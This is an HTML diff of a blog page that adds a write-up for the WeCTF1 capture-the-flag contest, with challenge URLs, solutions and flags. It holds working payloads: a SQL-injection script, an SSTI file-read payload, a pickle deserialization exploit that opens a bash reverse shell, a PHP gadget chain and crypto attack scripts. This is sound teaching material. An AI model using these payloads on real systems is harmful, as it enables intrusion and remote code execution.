@@ -7,7 +7,7 @@
 <title>
     We_ax
 </title>
-<link rel="shortcut icon" href="https://we-ax.github.io/favicon.ico?v=1570298648399">
+<link rel="shortcut icon" href="https://we-ax.github.io/favicon.ico?v=1570367949691">
 <!-- <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"> -->
 <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
@@ -27,7 +27,7 @@
     <div class="nav">
         <div class="logo">
             <a href="https://we-ax.github.io">
-                <img class="avatar" src="https://we-ax.github.io/images/avatar.png?v=1570298648399" alt="">
+                <img class="avatar" src="https://we-ax.github.io/images/avatar.png?v=1570367949691" alt="">
             </a>
             <div class="site-title">
                 <h1>
@@ -99,6 +99,1353 @@
         
             <article class="post i-card">
                 <h2 class="post-title">
+                    <a href="https://we-ax.github.io/post/wectf1-writeup">
+                        Wectf1--WriteUp
+                    </a>
+                </h2>
+                <div class="post-info">
+                    <time class="post-time">2019-10-06</time>
+                    
+                        <a href="https://we-ax.github.io/tag/4REPgFG5c" class="post-tag i-tag
+                            i-tag-error">
+            #writeup
+        </a>
+                        
+                </div>
+                <div class="post-article">
+                    
+                        <a href="https://we-ax.github.io/post/wectf1-writeup" class="post-feature-image" style="background-image:url(https://api.ixiaowai.cn/mcapi/mcapi.php) ">
+                        </a>
+                        
+                            <div class="post-content">
+                                
+                                        <div class="post-content-content">
+                                            说明：题目要思路清晰，禁止脑洞。简单题目可以略多一点。主要考察同学们的基本功、进阶式的考察代码审计能力、脚本编写能力。
+web方向 至少10道，其他方向，至少6道题。
+出题者，在每道题目后，写上自己的出题和解题思路、链接、flag。
+Welcome to the first of WeCTF
+Web
+Web题目中至少2道题考代码审计。
+web签到
+http://119.23.236.68:63006/web1/index.php
+查看源代码
+wectf{the_iiiis_flag}
+easy01
+http://119.23.236.68:63006/easy/index.php
+源码提示 get name == wectf
+payload ： http://119.23.236.68:63006/easy/index.php?name=wectf
+wectf{1e2e3c4a5d6c123d456eaec456789f}
+easy02
+http://119.23.236.68:63006/web2/index.php
+XFF 伪造 127.0.0.1
+wectf{X_FORWARDED_FOR_is}
+easy03
+http://119.23.236.68:63006/web4/index.php
+抓包，header
+wectf{header_must_be_win}
+medium01
+http://119.23.236.68:63006/web3/index.php
+&amp;lt;?php 
+highlight_file(&amp;quot;source.php&amp;quot;); 
+if(isset($_GET[&#39;a&#39;])) 
+{ 
+    $a = trim($_GET[&#39;a&#39;]); 
+    if($a&amp;gt;999999 and strlen($a)&amp;lt;5) 
+    { 
+        echo &amp;quot;wectf{xxxxxxxxxxxxxxx}&amp;quot;; 
+    } 
+} 
+?&amp;gt;
+
+payload : http://119.23.236.68:63006/web3/index.php?a=1e9
+wectf{eeeeeeeee_is_low}
+medium02
+http://119.23.236.68:63006/web5/index.php
+&amp;lt;?php
+error_reporting(0);
+highlight_file(&amp;quot;source.php&amp;quot;);
+$name = $_COOKIE[&#39;pass&#39;];
+if($name == &amp;quot;password&amp;quot;)
+{
+    extract($_POST);
+    if($name == &amp;quot;isnotonly&amp;quot;)
+    {
+        echo &amp;quot;wectf{xxxxxxxxxxxxxx}&amp;quot;;
+    }
+}
+?&amp;gt;
+
+payload：
+curl http://119.23.236.68:63006/web5/index.php --cookie &amp;quot;pass=password&amp;quot; --data &amp;quot;name=isnotonly&amp;quot;
+
+wectf{flag_1s_here}
+medium03
+http://119.23.236.68:63006/medium/index.php
+&amp;lt;?php 
+highlight_file(&#39;source.php&#39;); 
+error_reporting(0); 
+$flag = &#39;wectf{xxxxxxxxxxxxxxxx}&#39;; 
+if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;username&#39;]) and isset($_POST[&#39;password&#39;])) { 
+    if ($_GET[&#39;username&#39;] == $_POST[&#39;password&#39;]){ 
+        die(&#39;exit&#39;); 
+    } 
+    else if(sha1($_GET[&#39;username&#39;]) === sha1($_POST[&#39;password&#39;])) 
+    { 
+        $name = urldecode($_GET[&#39;name&#39;]); 
+        if ($name === &#39;wectf!@#$wectf&#39;) 
+        { 
+            die(&#39;Flag: &#39;.$flag); 
+        } 
+    } 
+} 
+?&amp;gt; 
+
+
+wectf{e2e123acef456789d132f456c13}
+high01
+http://119.23.236.68:63006/high/index.php
+import requests
+import base64
+import string
+
+s = requests.session()
+url = &amp;quot;http://119.23.236.68:63006/high/index.php&amp;quot;
+
+header = {&#39;User-Agent&#39;: &#39;Kylinbrowser&#39;,
+&#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,
+&#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;,
+&#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
+&#39;Referer&#39;: &#39;http://119.23.236.68:63006/high/index.php&#39;,
+&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,
+&#39;Content-Length&#39;: &#39;29&#39;,
+&#39;Connection&#39;: &#39;close&#39;,
+&#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;}
+bdata = {
+    &#39;username&#39;:&amp;quot;admin&amp;quot;,
+    &#39;password&#39;:&amp;quot;admin&#39; or &#39;2&#39;&amp;gt;&#39;1&amp;quot;
+}
+base = s.post(url,headers=header,data=bdata).text
+
+flag = &amp;quot;&amp;quot;
+# while True:
+for i in &amp;quot;{}0123456789abcdefghijklmnopqrstuvwxyz&amp;quot;:
+    try:
+        data = {
+            &#39;username&#39;:&amp;quot;admin&amp;quot;,
+            &#39;password&#39;:&amp;quot;admin&#39; or &#39;2&#39;&amp;gt;&#39;1&#39; union select 1,&#39;ad&#39;,&#39;%s&#39; order by 3,&#39;1&amp;quot; % i
+        }
+        html = s.post(url,headers=header,data=data).text
+        print(i,html)
+    except:
+
+pass
+wectf{this_15s_high_inject}
+high02
+http://119.23.236.68:63007/
+提示： flag.txt 在根目录下，直接读就好
+payload：
+http://119.23.236.68:63007/?name={{().class.bases[0].subclasses()[177].init.globals.builtins%27open%27.read()}}
+wectf{what_a_easy_ssti}
+high03
+http://119.23.236.68:63008/
+提示： flag.txt 在根目录下
+给源码：
+app.py
+import requests
+import pickle
+import os
+class exp(object):
+    def __reduce__(self):
+        payload = &amp;quot;&amp;quot;&amp;quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;127.0.0.1&amp;quot;,6300));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&amp;quot;&amp;quot;&amp;quot;
+        return (os.system,(payload,))
+e = exp()
+s = pickle.dumps(e)
+print(s)
+data = {
+    &#39;a&#39;:s
+}
+html = requests.post(&amp;quot;http://119.23.236.68:63008/&amp;quot;,data=data).content
+print(html)
+
+wectf{just_fanxuliehua_python}
+crazy01
+http://119.23.236.68:63006/crazy01/index.php
+题目描述：就是一个php反序列化
+##exp.php
+&amp;lt;?php
+class O00O
+{
+        public $value;
+        public function __construct()
+        {
+                $this-&amp;gt;value = new Call();
+        }
+        public function __destruct()
+        {
+                $this-&amp;gt;value-&amp;gt;func1();
+        }
+}
+class Call
+{
+        public $value;
+        public function __construct()
+        {
+                $this-&amp;gt;value = new Func_t();
+        }
+        public function func1()
+    {
+            $this-&amp;gt;value-&amp;gt;func2();
+    }
+}
+class Func_t
+{
+        public $value;
+        public function __construct()
+        {
+                $this-&amp;gt;value = new Func_m();
+        }
+        public function __call($func2,$a)
+        {
+                $func = $this-&amp;gt;value;
+                $func();
+        }
+}
+class Func_m
+{
+        public $value1;
+        public $value2;
+        public function __construct()
+        {
+                $this-&amp;gt;value1 = new Ina();
+        }
+        public function __invoke()
+        {
+                $this-&amp;gt;value2 = &amp;quot;flag&amp;quot;.$this-&amp;gt;value1;
+        } 
+}
+class Ina
+{
+        public $value;
+        public function __construct()
+        {
+                $this-&amp;gt;value = new GetFlag();
+        }
+        public function __toString()
+        {
+                $this-&amp;gt;value-&amp;gt;get_flag();
+                return &amp;quot;1&amp;quot;;
+        }
+}
+class GetFlag
+{
+    public function get_flag()
+    {
+        echo &amp;quot;flag{xxxxxxxxxxxxxxxxx}&amp;quot;;
+    }
+}
+$b = new O00O;                                       
+echo urlencode(serialize($b)).&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;;       
+
+生成payload：
+O%3A4%3A%22O00O%22%3A1%3A%7Bs%3A5%3A%22value%22%3BO%3A4%3A%22Call%22%3A1%3A%7Bs%3A5%3A%22value%22%3BO%3A6%3A%22Func_t%22%3A1%3A%7Bs%3A5%3A%22value%22%3BO%3A6%3A%22Func_m%22%3A2%3A%7Bs%3A6%3A%22value1%22%3BO%3A3%3A%22Ina%22%3A1%3A%7Bs%3A5%3A%22value%22%3BO%3A7%3A%22GetFlag%22%3A0%3A%7B%7D%7Ds%3A6%3A%22value2%22%3BN%3B%7D%7D%7D%7D
+
+
+flag{unserialize_php_O00O}
+Misc
+ROT13（签到题）
+rot13 编码，我相信你能找到解码方式
+flag = &amp;quot;xxxxxxxxxxxxxxxx&amp;quot;
+print flag.encode(&#39;rot13&#39;)
+#jrpgs{E0g13_fb_rnfl_jr1p0zr_gb_jrpgs}
+
+flag：wectf{R0t13_so_easy_we1c0me_to_wectf}
+贝斯家族
+你听说过大名鼎鼎的贝斯（base）家族吗？
+4D515A464D32544549354E444F574C4B4B4A35465556525950424D57594F4B474A565744514D535A4C415944323D3D3D
+源码：
+flag = &#39;××××××××××××××&#39;
+print base64.b16encode(base64.b32encode(base64.b64encode(flag)))
+#4D515A464D32544549354E444F574C4B4B4A35465556525950424D57594F4B474A565744514D535A4C415944323D3D3D
+
+flag  :  wectf{b4se_1b_E2_6a}
+ASCII码
+听说过 ASCII 码吗，试试解码这个，仔细看 ASCII 码表
+77656374667b315f346d5f66346b655f08080808085f666c34677d
+源码：
+enc = &#39;wectf{1_4m_f4ke_\b\b\b\b\bfl4g}&#39;.encode(&#39;hex&#39;)
+print enc
+#77656374667b315f346d5f66346b655f08080808085f666c34677d
+
+其实这个就是玩了一点花样，0x08 是退格，5个退格就把 f4ke_ 删掉，就是真的 flag
+flag : wectf{1_4m_fl4g}
+babypcap
+goodluck.pcap
+我通过 nc 把 flag 从 192.168.229.1 发送到 192.168.229.128
+进去跟踪 tcp 流就能看到flag
+
+flag : wectf{4maz1n9_pcap}
+.........
+这是个啥东西
+你知道 png 文件的文件格式吗？
+WECTF.png.zip
+flag：wectf{pn9_h4s_n0_he4d}
+这个题目我去掉了 png 的文件头
+89 50 4E 47 0D 0A 1A 0A
+
+https://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/)
+whoami
+whoami.py：
+tmp = &#39;&#39;
+enc = &#39;\xfc\xfe`\xec\xf8\xe2\xee`\xf0\xf2\xe2\xf0\xf2\xe2\xf0\xf2\xe2&#39;
+flag = input(&amp;quot;flag :&amp;quot;)
+for i in flag:
+    tmp += chr((ord(i) * 2 ^ 0x20))
+
+if tmp == enc:
+    print(&amp;quot;you get it, but......&amp;quot;)
+else:
+    print(&amp;quot;error!&amp;quot;)
+
+tmp = &#39;&#39;
+enc = &#39;\xfc\xfe`\xec\xf8\xe2\xee`\xf0\xf2\xe2\xf0\xf2\xe2\xf0\xf2\xe2&#39;
+flag = input(&amp;quot;flag :&amp;quot;)
+for i in flag:
+    tmp += chr((ord(i) * 2 ^ 0x20))
+
+if tmp == enc:
+    print(&amp;quot;you get it, but......&amp;quot;)
+else:
+    print(&amp;quot;error!&amp;quot;)
+
+
+tmp = &#39;&#39;
+enc = &#39;\xfc\xfe`\xec\xf8\xe2\xee`\xf0\xf2\xe2\xf0\xf2\xe2\xf0\xf2\xe2&#39;
+flag = input(&amp;quot;flag :&amp;quot;)
+for i in flag:
+    tmp += chr((ord(i) * 2 ^ 0x20))
+
+if tmp == enc:
+    print(&amp;quot;you get it, but......&amp;quot;)
+else:
+    print(&amp;quot;error!&amp;quot;)
+
+tmp = &#39;&#39;
+enc = &#39;\xfc\xfe`\xec\xf8\xe2\xee`\xf0\xf2\xe2\xf0\xf2\xe2\xf0\xf2\xe2&#39;
+flag = input(&amp;quot;flag :&amp;quot;)
+for i in flag:
+    tmp += chr((ord(i) * 2 ^ 0x20))
+
+if tmp == enc:
+    print(&amp;quot;you get it, but......&amp;quot;)
+else:
+    print(&amp;quot;error!&amp;quot;)
+
+tmp = &#39;&#39;
+enc = &#39;\xfc\xfe`\xec\xf8\xe2\xee`\xf0\xf2\xe2\xf0\xf2\xe2\xf0\xf2\xe2&#39;
+flag = input(&amp;quot;flag :&amp;quot;)
+for i in flag:
+    tmp += chr((ord(i) * 2 ^ 0x20))
+
+if tmp == enc:
+    print(&amp;quot;you get it, but......&amp;quot;)
+else:
+    print(&amp;quot;error!&amp;quot;)
+
+tmp = &#39;&#39;
+enc = &#39;\xfc\xfe`\xec\xf8\xe2\xee`\xf0\xf2\xe2\xf0\xf2\xe2\xf0\xf2\xe2&#39;
+flag = input(&amp;quot;flag :&amp;quot;)
+for i in flag:
+    tmp += chr((ord(i) * 2 ^ 0x20))
+
+if tmp == enc:
+    print(&amp;quot;you get it, but......&amp;quot;)
+else:
+    print(&amp;quot;error!&amp;quot;)
+
+足够长
+然后用 python3.6 编译成 pyc
+whoami.pyc
+whoami.cpython-36.pyc
+解出这个并没有什么用，因为 flag 不在代码里面
+用这个 https://github.com/AngelKitty/stegosaurus 隐写
+python3.6 stegosaurus.py whoami.cpython-36.pyc -s --payload &amp;quot;you get it wectf{stegosaurus_g00d}&amp;quot;
+
+解出 flag：
+python3.6 stegosaurus.py -x whoami.cpython-36.pyc
+
+钛合金狗眼
+拿到图片首先binwalk跑一下，发现图片之后，一句foremost直接分离
+
+放大第二张图片之后发现整齐的噪点，可以推测通道里面藏着信息
+百度搜索关键词： CTF 两张图片，得到某次比赛的wp
+http://blog.sina.com.cn/s/blog_9cd8465f0102v6ok.html
+按照网上的答案，写脚本进行比较：
+
+发现与网上的题目差不多，比赛那题是red通道隐藏信息，这题是blue通道隐藏信息。
+再继续写代码把blue通道里面隐藏的信息提取出来
+
+得到一串长度为2809的二进制数样子的字符串，即5353
+接下来创建一个5353像素的图片， 将1和0转化为黑色像素点和白色像素点
+
+ 
+得到一张二维码图片，但是并不能扫出来
+再另外建立一张同样大小的图片，然后将该图片行列转置，保存在新图中
+ 
+
+用手机扫描转置后的图片，得到flag
+flag{8fgd2svxc6zbikyt4}
+
+SKsteg
+babySteg.zip
+encode.py:
+from PIL import Image
+
+def banner():
+    bnr = &#39;&#39;&#39;
+:&#39;######::&#39;##:::&#39;##::&#39;######::&#39;########:&#39;########::&#39;######:::
+&#39;##... ##: ##::&#39;##::&#39;##... ##:... ##..:: ##.....::&#39;##... ##::
+ ##:::..:: ##:&#39;##::: ##:::..::::: ##:::: ##::::::: ##:::..:::
+. ######:: #####::::. ######::::: ##:::: ######::: ##::&#39;####:
+:..... ##: ##. ##::::..... ##:::: ##:::: ##...:::: ##::: ##::
+&#39;##::: ##: ##:. ##::&#39;##::: ##:::: ##:::: ##::::::: ##::: ##::
+. ######:: ##::. ##:. ######::::: ##:::: ########:. ######:::
+:......:::..::::..:::......::::::..:::::........:::......::::
+author：We_ax--Scriptkiddies
+    &#39;&#39;&#39;
+    print(bnr)
+
+def str_convert_bin(s):
+    result = &#39;&#39;
+    for c in s:
+        b = bin(ord(c)).replace(&#39;0b&#39;, &#39;&#39;)
+        b = &#39;0&#39; * (7 - len(b)) + b
+        result = result + b
+    return result
+
+def insert(im, bin1):
+    size = im.size
+    length = len(bin1)
+    print(length)
+    k = 0
+    flag = 0
+    for i in range(1, size[0]):
+        for j in range(size[1]):
+            idx = (i * j) % 3
+            pixel = bin(im.getpixel((i, j))[idx]).replace(&#39;0b&#39;, &#39;&#39;)
+            if idx == 0:
+                if pixel[-1:] &amp;lt; bin1[k]:
+                    im.putpixel((i, j), (im.getpixel(
+                        (i, j))[0] + 1, im.getpixel(
+                            (i, j))[1], im.getpixel((i, j))[2]))
+                if pixel[-1:] &amp;gt; bin1[k]:
+                    im.putpixel((i, j), (im.getpixel(
+                        (i, j))[0] - 1, im.getpixel(
+                            (i, j))[1], im.getpixel((i, j))[2]))
+                k = k + 1
+                if k == length:
+                    flag = 1
+                    break
+            elif idx == 1:
+                if pixel[-1:] &amp;lt; bin1[k]:
+                    im.putpixel((i, j), (im.getpixel(
+                        (i, j))[0], im.getpixel(
+                            (i, j))[1] + 1, im.getpixel((i, j))[2]))
+                if pixel[-1:] &amp;gt; bin1[k]:
+                    im.putpixel((i, j), (im.getpixel(
+                        (i, j))[0], im.getpixel(
+                            (i, j))[1] - 1, im.getpixel((i, j))[2]))
+                k = k + 1
+                if k == length:
+                    flag = 1
+                    break
+            elif idx == 2:
+                if pixel[-1:] &amp;lt; bin1[k]:
+                    im.putpixel((i, j), (im.getpixel(
+                        (i, j))[0], im.getpixel((i, j))[1], im.getpixel(
+                            (i, j))[2] + 1))
+                if pixel[-1:] &amp;gt; bin1[k]:
+                    im.putpixel((i, j), (im.getpixel(
+                        (i, j))[0], im.getpixel((i, j))[1], im.getpixel(
+                            (i, j))[2] - 1))
+                k = k + 1
+                if k == length:
+                    flag = 1
+                    break
+
+        if flag == 1:
+            break
+    print(&amp;quot;over\n\n&amp;quot;)
+    im.save(&amp;quot;out.bmp&amp;quot;)
+
+def main():
+    banner()
+    test_str = input(&amp;quot;flag :  &amp;quot;)
+    result = str_convert_bin(test_str)
+    im = Image.open(&amp;quot;in.bmp&amp;quot;)
+    insert(im, result)
+
+if __name__ == &#39;__main__&#39;:
+    main()
+
+decode.py：
+#-*- coding: utf-8 -*-
+from PIL import Image
+def bin_convert_str(b):
+    str=&#39;&#39;
+    b1 = [b[i:i+7] for i in range(0, len(b), 7)]
+    for i in range(len(b1)):
+        b2 = chr(int(b1[i],2))
+        str = str+b2
+    return str
+
+def extract(im,length):
+    size = im.size
+    k=0
+    result=&#39;&#39;
+    flag=0
+
+    for i in range(1, size[0]):
+        for j in range(size[1]):
+            idx = (i * j) % 3
+            pixel_b=bin(im.getpixel((i,j))[idx]).replace(&#39;0b&#39;, &#39;&#39;)
+            result=result+pixel_b[-1:]
+            k=k+1 
+
+            if k==length:
+                flag=1
+                break
+        if flag==1:
+            break
+    print(&amp;quot;提取完成，二进制字符串为：\n%s&amp;quot;%result)
+    str = bin_convert_str(result)
+    print(&amp;quot;转换完成，结果为：\n%s&amp;quot;%str)
+im = Image.open(&#39;out.bmp&#39;)
+extract(im, 200)
+
+这个题目我就是魔改了传统的 lsb 隐写
+我把 flag 转成 bin
+第 k 个 bit 放在第 i * j 个像素点的 r 通道，第 k + 1 个 bit 放在第 i * j +1 个像素点 g 通道 ，第 k + 2 个 bit 放在第 i * j + 2个像素点 b 通道 ，一个像素点我只放一个 bit 而且 下一个像素点写入通道和前一个不一样， 这样 Stegsolve 或者现有的隐写工具 也没办法解出来，当时我还想打乱顺序 不是 RGB 顺序写入，而是随机写入 保存随机数，让他们根据随机数去读取对应位置的数据，想了想有点过分，还是算了
+这个题要是想解，老老实实写脚本，写完就了解 lsb 是个什么东西了
+原本想用 c 出，写成逆向题的，但是想了想还是算了，出成逆向有点难了
+flag：wectf{lsb_so_easy_hiahiahia}
+Crypto
+签到
+为了证明你的存在，Q群：930446586   flag在公告
+wectf{this_is_format_of_flag}
+guess
+密文：U2FsdGVkX19x8Dq5FttochQw/lMz8C5gFD6PQjKZvtxBjb0Sab8cIqXqBpMne5vx
+明文：wectf{wectf_weCTF_WeCTF}
+解：
+这个题不给加密类型，base64 解码后可以看见 Salted ，判断是 AES
+无秘钥解出 flag
+解码网址  http://tools.jb51.net/password/aes_encode
+cxk=xcp
+给源文件：
+lowercase = &amp;quot;abcdefghijklnmopqrstuvqxyz&amp;quot;
+uppercase = &amp;quot;ABCDEFGHIJKLMNOPQRSTUVQXYZ&amp;quot;
+digest = &amp;quot;0123456789&amp;quot;
+plaintext = &amp;quot;what are you doing? you can join crypt group. flag is wectf{xxxxxxxxxxxxx}&amp;quot;
+ciphertext = &amp;quot;&amp;quot;
+for i in range(len(plaintext)):
+    if plaintext[i] in lowercase:
+        enc = ord(&#39;a&#39;) + (ord(&#39;z&#39;) - ord(plaintext[i]))%26
+    elif plaintext[i] in uppercase:
+        enc = ord(&#39;A&#39;) + (ord(&#39;Z&#39;) - ord(plaintext[i]))%26
+    elif plaintext[i] in digest:
+        enc = ord(&#39;0&#39;) + (ord(&#39;9&#39;) - ord(plaintext[i]))%10
+    else:
+        enc = ord(plaintext[i])
+    ciphertext += chr(enc)
+print(ciphertext)
+## ciphertext : wszg ziv blf wlrmt? blf xzm qlrm xibkg tilfk. uozt rh wvxgu{hzev_h5ev_nv}
+
+加密即解密，将ciphertext代入plaintext再运行一次就得。
+wectf{save_s4ve_me}
+老套的md5
+小明又泼墨水了，墨水这次泼到 wectf 的flag上面了，明文中有三个字符被挡住了，巧的很，明文的md5值咱们知道，而且他没有被泼墨水，简单了把
+明文：wectf{ab?def?hijklm?opq}
+密文：84e7ab5946fb4c5d94ed891c42d5fac6
+import string
+import hashlib
+
+for i in string.ascii_lowercase:
+    for j in string.ascii_lowercase:
+        for k in string.ascii_lowercase:
+            a = &amp;quot;wectf{ab&amp;quot;+i+&amp;quot;def&amp;quot;+j+&amp;quot;hijklm&amp;quot;+k+&amp;quot;opq}&amp;quot;
+            c = hashlib.md5(a)
+            b = c.hexdigest()
+            if b == &amp;quot;84e7ab5946fb4c5d94ed891c42d5fac6&amp;quot;:
+                print(a)
+
+wectf{abzdefhhijklmlopq}
+babyRSA
+Rsa 是不可攻破的吗？
+from Crypto.Util.number import bytes_to_long
+flag = raw_input(&amp;quot;flag : &amp;quot;)
+tmp = bytes_to_long(flag)
+n = 47966708183289639962501363163761864399454241691014467172805658518368423135168025285144721028476297179341434450931955275325060173656301959484440112740411109153032840150659
+e = 3
+c = pow(tmp, e, n)
+if c == 1495572858946434740124351882099461657145759077753704214627609673423129831012766355967962871807110976347627163520955975614562262871102943487213224386685367602432775269:
+    print &amp;quot;you get it!&amp;quot;
+else:
+    print &amp;quot;Too Young, Too simple!&amp;quot;
+
+这个题目考的是最简单的 Rsa 小指数攻击
+flag : wectf{rs4_e=3_n0T_s4fE}
+exp:
+from Crypto.Util.number import *
+import primefac
+import gmpy2
+
+def modinv(a,n):
+    return primefac.modinv(a,n) % n
+n=47966708183289639962501363163761864399454241691014467172805658518368423135168025285144721028476297179341434450931955275325060173656301959484440112740411109153032840150659
+e=3
+c=1495572858946434740124351882099461657145759077753704214627609673423129831012766355967962871807110976347627163520955975614562262871102943487213224386685367602432775269
+
+i=0
+while 1:
+    if(gmpy2.iroot(c+i*n, 3)[1]==1):
+        print long_to_bytes(gmpy2.iroot(c+i*n, 3)[0])
+        break
+    i=i+1
+
+
+脑筋急转弯
+import random
+import time
+import os
+import sys
+from Crypto.Cipher import DES
+
+class Unbuffered(object):
+   def __init__(self, stream):
+       self.stream = stream
+   def write(self, data):
+       self.stream.write(data)
+       self.stream.flush()
+   def __getattr__(self, attr):
+       return getattr(self.stream, attr)
+
+#取消缓冲
+sys.stdout = Unbuffered(sys.stdout)
+
+#设定闹铃，5分钟进程自杀
+import signal
+signal.alarm(300)
+
+
+flag=r&amp;quot;wectf{baby_crypt0_DES}&amp;quot;
+hint = &#39;&#39;&#39;
+Welcome to my world, where you can enter a string of characters to get a bunch of encrypted data, the things you want are in this string of data.
+Encryption method: DES(&amp;quot;your input&amp;quot;+flag)
+&#39;&#39;&#39;
+print(hint)
+
+key = os.urandom(8)
+
+def des_cbc(key,m):
+    handler=DES.new(key,DES.MODE_ECB)
+    return handler.encrypt(m).encode(&amp;quot;hex&amp;quot;)
+
+while True:
+    input = raw_input(&amp;quot;&amp;gt;&amp;gt; &amp;quot;)
+    token = input + flag
+    tmp = len(token)/16
+    token = token.ljust((tmp+1)*16,&amp;quot;0&amp;quot;)
+    checksum=des_cbc(key,token)
+    print(&amp;quot;checksum: &amp;quot;+checksum)
+
+##exp.py
+import socket
+import string
+import time
+def Checker(s):
+    flag = &amp;quot;&amp;quot;
+    strings = &amp;quot;-_{}%/+=:&amp;quot; + string.ascii_letters + string.digits
+    for i in range(47,-1,-1):
+        error = 1
+        s.send(&amp;quot;@&amp;quot;*i + &amp;quot;\n&amp;quot;)
+        temp = s.recv(2048)
+        if &amp;quot;checksum&amp;quot; not in temp:
+            temp = s.recv(1024)
+        for k in strings:
+            s.send(&amp;quot;@&amp;quot;*i + flag + k + &amp;quot;\n&amp;quot;)
+            value = s.recv(1024)[:106]
+            if &amp;quot;checksum&amp;quot; not in value:
+                value = s.recv(1024)[:106]
+            if value == temp[:106]:
+                flag += k
+                print(flag)
+                error = 0
+                break
+        if error == 1:
+            flag += &amp;quot;@&amp;quot;
+            print(flag)
+
+
+host = &amp;quot;39.98.246.99&amp;quot;
+port = 11112
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((host, port))
+banner = sock.recv(3048)
+print(banner)
+flagvalue = sock.recv(2048)
+Checker(sock)
+
+wectf{baby_crypt0_DES}
+attack CBC
+class Unbuffered(object):
+   def __init__(self, stream):
+       self.stream = stream
+   def write(self, data):
+       self.stream.write(data)
+       self.stream.flush()
+   def __getattr__(self, attr):
+       return getattr(self.stream, attr)
+import sys
+sys.stdout = Unbuffered(sys.stdout)
+import signal
+signal.alarm(600)
+
+import random
+import time
+flag=open(&amp;quot;flag&amp;quot;,&amp;quot;r&amp;quot;).read()
+
+from Crypto.Cipher import AES
+import os
+
+def aes_cbc(key,iv,m):
+    handler=AES.new(key,AES.MODE_CBC,iv)
+    return handler.encrypt(m).encode(&amp;quot;hex&amp;quot;)
+def aes_cbc_dec(key,iv,c):
+    handler=AES.new(key,AES.MODE_CBC,iv)
+    return handler.decrypt(c.decode(&amp;quot;hex&amp;quot;))
+
+key=os.urandom(16)
+iv=os.urandom(16)
+session=os.urandom(8)
+token=&amp;quot;session=&amp;quot;+session.encode(&amp;quot;hex&amp;quot;)+&amp;quot;;admin=0&amp;quot;
+checksum=aes_cbc(key,iv,token)
+print token+&amp;quot;;checksum=&amp;quot;+checksum
+for i in range(10):
+    token_rcv=raw_input(&amp;quot;token:&amp;quot;)
+    if token_rcv.split(&amp;quot;admin=&amp;quot;)[1][0]==&#39;1&#39; and token_rcv.split(&amp;quot;session=&amp;quot;)[1][0:16].decode(&amp;quot;hex&amp;quot;)==session:
+        c_rcv=token_rcv.split(&amp;quot;checksum=&amp;quot;)[1].strip()
+        m_rcv=aes_cbc_dec(key,iv,c_rcv)
+        print m_rcv
+        if m_rcv.split(&amp;quot;admin=&amp;quot;)[1][0]==&#39;1&#39;:
+            print flag
+
+CBC 加密就是把上一个块的密文当成下一个块的 IV
+
+代码中
+if m_rcv.split(&amp;quot;admin=&amp;quot;)[1][0]==&#39;1&#39;:
+  print flag
+
+就是检查了传回来的 token 是不 admin=1，等于 1 的话就印出 flag
+不会检查其他块是否能解密，这样我们修改上一个块的密文中 admin=0 的 0 的对应异或的那个字符把它 异或上 0 再异或上 1 就能达到修改 admin=1 的目的（注意这里的 0 和 1 是 char 不是 int）
+运行的时候是这样的
+session=a84b3aee320ae1e2;admin=0;checksum=551d730d1e45de5033aecce896e874b1ab77327d9bcee3d3906ff29d95e5e0f7
+token:
+
+session=a84b3aee
+320ae1e2;admin=0
+checksum：
+551d730d1e45de5033aecce896e874b1
+ab77327d9bcee3d3906ff29d95e5e0f7
+
+0 的对应字符是 e
+checksum 上就是
+b1
+f7
+
+把 hex(0xb1 ^ ord(&#39;0&#39;) ^ ord(&#39;1&#39;))
+等于 0xb0
+用 b0 代替 b1 构造 payload：
+session=a84b3aee320ae1e2;admin=1;checksum=551d730d1e45de5033aecce896e874b0ab77327d9bcee3d3906ff29d95e5e0f7
+
+session=a84b3aee320ae1e2;admin=0;checksum=551d730d1e45de5033aecce896e874b1ab77327d9bcee3d3906ff29d95e5e0f7
+token:session=a84b3aee320ae1e2;admin=1;checksum=551d730d1e45de5033aecce896e874b0ab77327d9bcee3d3906ff29d95e5e0f7
+�C�(�u&#39;����ԽM320ae1e2;admin=1
+wectf{attack_AESCBC_by_Bit-flip}
+
+可以看到前面的块已经解不出原文了，因为我们修改了它的密文，但是我们只 check admin 是不是等于 1
+这个攻击的名字叫：比特翻转
+exp：
+from zio import *
+
+host = &#39;&#39;
+port = 
+def cbc_bit_attack_mul(c,m,position,target):
+    l = len(position)
+    r=c
+    for i in range(l):
+        change=position[i]-16
+        tmp=chr(ord(m[position[i]])^ord(target[i])^ord(c[change]))
+        r=r[0:change]+tmp+r[change+1:]
+    return r
+
+
+target=(host ,port)
+io=zio(target)
+io.read_until(&amp;quot;session=&amp;quot;)
+session=io.read(16)
+io.read_until(&amp;quot;checksum=&amp;quot;)
+c=io.readline().strip()
+
+t1=&amp;quot;session=&amp;quot;+session+&amp;quot;;admin=0&amp;quot;
+
+newchecksum=cbc_bit_attack_mul(c.decode(&amp;quot;hex&amp;quot;),t1,[16+16-1],[&#39;1&#39;])
+io.writeline(&amp;quot;session=&amp;quot;+session+&amp;quot;;admin=1;checksum=&amp;quot;+newchecksum.encode(&amp;quot;hex&amp;quot;))
+
+io.interact()
+
+Reverse
+xor
+linux  for循环 xor
+没什么好说的
